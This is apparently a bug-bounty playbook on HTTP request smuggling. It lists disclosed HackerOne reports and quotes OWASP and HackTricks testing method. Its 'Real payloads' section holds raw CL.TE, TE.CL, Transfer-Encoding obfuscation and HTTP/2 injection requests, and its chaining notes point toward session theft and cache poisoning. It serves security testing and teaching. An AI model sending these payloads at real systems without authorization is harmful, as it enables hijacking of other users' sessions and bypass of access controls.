# Real-World Playbook — HTTP Request Smuggling

**Class:** `request-smuggling` · **Coverage-matrix tier:** 2 · **Hunter2:** novel-vuln-reasoner · vuln_scanner.sh · **Skill:** web2-vuln-classes
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Why it pays (real bounty signal)
Top disclosed HTTP Request Smuggling reports peak at **$7,500**. Rewarded across: Basecamp, Cloudflare Public Bug Bounty, GSA Bounty, Internet Bug Bounty, Lob, Mail.ru, New Relic, Visma Public.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **HTTP Request Smuggling via HTTP/2** — Basecamp, $7,500 · 298👍 · [1211724](https://hackerone.com/reports/1211724)
- **HTTP Request Smuggling in Transform Rules using hexadecimal escape sequences in the concat() function** — Cloudflare Public Bug Bounty, $6,000 · 116👍 · [1478633](https://hackerone.com/reports/1478633)
- **HTTP request smuggling (?) canpol.deti.mail.ru** — Mail.ru, $5,000 · 241👍 · [957881](https://hackerone.com/reports/957881)
- **Possibility of Request smuggling attack** — Internet Bug Bounty, $4,660 · 93👍 · [2280391](https://hackerone.com/reports/2280391)
- **CVE-2024-21733 Apache Tomcat HTTP Request Smuggling (Client- Side Desync) (CWE: 444)** — Internet Bug Bounty, $4,660 · 57👍 · [2327341](https://hackerone.com/reports/2327341)
- **Request Smuggling in Apache Tomcat (Important, CVE-2023-45648)** — Internet Bug Bounty, $4,660 · 51👍 · [2299692](https://hackerone.com/reports/2299692)
- **HTTP request smuggling with Origin Rules using newlines in the host_header action parameter** — Cloudflare Public Bug Bounty, $3,100 · 46👍 · [1575912](https://hackerone.com/reports/1575912)
- **Password theft login.newrelic.com via Request Smuggling** — New Relic, $3,000 · 490👍 · [498052](https://hackerone.com/reports/498052)
- **Apache HTTP Server: mod_proxy_ajp: Possible request smuggling** — Internet Bug Bounty, $2,400 · 21👍 · [1594627](https://hackerone.com/reports/1594627)
- **HTTP Request Smuggling Due to Incorrect Parsing of Header Fields** — Internet Bug Bounty, $1,800 · 15👍 · [1888760](https://hackerone.com/reports/1888760)
- **HTTP Request Smuggling via Empty headers separated by CR** — Internet Bug Bounty, $1,800 · 15👍 · [2032842](https://hackerone.com/reports/2032842)
- **CVE-2022-32213 - HTTP Request Smuggling Due to Flawed Parsing of Transfer-Encoding** — Internet Bug Bounty, $1,800 · 13👍 · [1630668](https://hackerone.com/reports/1630668)
- **CVE-2022-32214 - HTTP Request Smuggling Due To Improper Delimiting of Header Fields** — Internet Bug Bounty, $1,800 · 11👍 · [1630669](https://hackerone.com/reports/1630669)
- **CVE-2022-32215 - HTTP Request Smuggling Due to Incorrect Parsing of Multi-line Transfer-Encoding** — Internet Bug Bounty, $1,800 · 6👍 · [1630667](https://hackerone.com/reports/1630667)
- **HTTP Request Smuggling on https://labs.data.gov** — GSA Bounty, $750 · 160👍 · [726773](https://hackerone.com/reports/726773)
- **http request smuggling in pscp.tv and periscope.tv** — X / xAI, $560 · 24👍 · [713285](https://hackerone.com/reports/713285)
- **HTTP Request Smuggling at app.workbox.dk** — Visma Public, $500 · 139👍 · [919988](https://hackerone.com/reports/919988)
- **HTTP Request Smuggling on vpn.lob.com** — Lob, $500 · 123👍 · [694604](https://hackerone.com/reports/694604)

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
```
POST / HTTP/1.1
Host: domain.example.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```
```
POST / HTTP/1.1
Host: domain.example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86
Content-Length: 4
Connection: close
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0


```
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```
```
:method GET
:path /
:authority www.example.com
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: www.example.com
```
```
POST / HTTP/1.1
Host: www.example.com
Content-Length: 37

GET / HTTP/1.1
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From OWASP WSTG (testing guide)
### HTTP Request Smuggling

|ID          |
|------------|
|WSTG-INJT-16|

#### Summary

HTTP Request Smuggling is a class of vulnerabilities caused by inconsistencies in how HTTP requests are parsed by frontend and backend components. When intermediaries such as reverse proxies, load balancers, or API gateways interpret request boundaries differently from backend servers, attackers may inject or "smuggle" hidden requests that are processed out of sequence.

Modern infrastructures significantly expand the attack surface by introducing HTTP/2, protocol downgrades (HTTP/2 → HTTP/1.1), and cleartext upgrades (H2C), where request normalization and translation logic frequently diverges from RFC expectations.

Request smuggling exploits arise when two or more HTTP parsers disagree on where a request begins or ends. Historically, this discrepancy was most commonly observed in conflicting interpretations of the `Content-Length` (CL) and `Transfer-Encoding` (TE) headers.

In modern architectures, additional desynchronization vectors emerge from:

- HTTP/2 to HTTP/1.1 translation layers
- Cleartext HTTP/2 (H2C) upgrade mechanisms
- Header normalization mismatches
- Reintroduced forbidden headers during protocol downgrade
- Connection reuse across protocol boundaries

These behaviors can lead to persistent desynchronization, cache poisoning, credential hijacking, and access control bypass.

#### Test Objectives

- Identify request boundary inconsistencies between frontend and backend components
- Detect classic CL/TE desynchronization vulnerabilities
- Evaluate protocol translation logic (HTTP/2 → HTTP/1.1)
- Assess H2C upgrade handling and downgrade safety
- Confirm backend request queue poisoning

#### How to Test

##### Black-Box Testing

###### CL.TE Desynchronization

In a CL.TE scenario, the frontend uses `Content-Length` to determine request size, while the backend honors `Transfer-Encoding`.

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

Expected Result:

- Backend stops parsing at the `0` chunk
- Smuggled request remains buffered
- Subsequent legitimate requests are corrupted or return unexpected responses (e.g., 404)

###### TE.CL Desynchronization


*(truncated — open the source link for the full method)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### HTTP Connection Request Smuggling


**HTTP connection request smuggling** is a **connection-state / routing** problem rather than a classic CL.TE/TE.CL parser discrepancy. The bug appears when a front-end decides **where a connection is allowed to go only once**, then silently reuses that same TCP/TLS connection for later requests with a different `Host` or `:authority`.<sup>[[1]](#references)[[2]](#references)</sup>

If you need the classic length-confusion variants, see [HTTP Request Smuggling / HTTP Desync Attack](http-request-smuggling/README.md) and [Request Smuggling in HTTP/2 Downgrades](http-request-smuggling/request-smuggling-in-http-2-downgrades.md).

#### Connection-State Attacks <a href="#state" id="state"></a>

##### First-request Validation

When routing requests, reverse proxies often depend on the **Host** header (or **`:authority`** in HTTP/2) to decide the destination back-end server and whether that destination is allowed. A recurring bug class is that this whitelist is **only enforced on the first request on a connection**. After that, the front-end trusts the connection itself instead of re-validating each request:

```http
GET / HTTP/1.1
Host: allowed-external-host.example

GET /admin HTTP/1.1
Host: internal-only.example
```

This turns connection reuse into an SSRF-like primitive against **internal virtual hosts**, admin panels, debug routes, and alternate tenants sharing the same edge.<sup>[[1]](#references)</sup>

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- CL.TE / TE.CL desync → poison next user's request → cred/session theft
- Smuggle → bypass front-end auth/WAF → reach internal path
- Smuggle → cache poisoning at scale

## Hunter2 wiring
- **Run:** `novel-vuln-reasoner · vuln_scanner.sh`
- **Skill:** `web2-vuln-classes`
- **Coverage-matrix tier:** 2 (Tier 0 = test first)
